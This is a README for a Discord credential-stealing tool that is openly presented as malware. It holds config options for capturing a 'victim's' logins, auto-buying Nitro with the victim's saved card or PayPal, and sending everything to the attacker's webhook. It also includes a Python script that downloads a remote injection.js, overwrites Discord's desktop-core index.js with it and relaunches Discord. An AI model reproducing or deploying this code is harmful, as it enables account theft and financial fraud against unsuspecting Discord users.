## 🚀・Configure Discord Injection!

You'll need [Git](https://git-scm.com) to start off!
```sh-session
git@2.17.1 or higher
```

### 1. From your command line, clone and configure discord-injection:

```bash
# Clone this repository
$ git clone https://github.com/rdimo/Discord-injection.git

```
Copy the raw url of the [injection](./injection.js) and then paste it in your code

[forking](https://github.com/Rdimo/Discord-injection/fork) this repo is also a viable way but make sure to go into the code and change the config to your preferences! ⇣⇣⇣

```javascript
const config = {
    auto_buy_nitro: true, //automatically buys nitro when the victim adds credit card or paypal account
    ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
    ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
    embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
    embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info
    embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
    webhook: '%WEBHOOK%', //your discord webhook there obviously

    ... //rest of the config you should NOT touch
};
```

## 🎈・Code example
Example of how you can implement this injection into your own malware
```py
import os
import requests
webhook = 'https://discord.com/apwebhooks/123456789/abcdefghijklmnopqrstuvwxyz'

def inject():
    for root, dirs, files in os.walk(os.getenv('localappdata')):
        for name in dirs:
            if "discord_desktop_core-" in name:
                try:
                    directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                except FileNotFoundError:
                    pass
                try:
                    os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\initiation"))
                except FileExistsError:
                    pass
                f = requests.get("https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js").text.replace("%WEBHOOK%", webhook)
                with open(directory_list, 'w', encoding="utf-8") as index_file:
                    index_file.write(f)
    for root, dirs, files in os.walk(os.getenv('appdata')+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
        for name in files:
            discord_file = os.path.join(root, name)
            os.startfile(discord_file)

if __name__ == "__main__":
    inject()
```
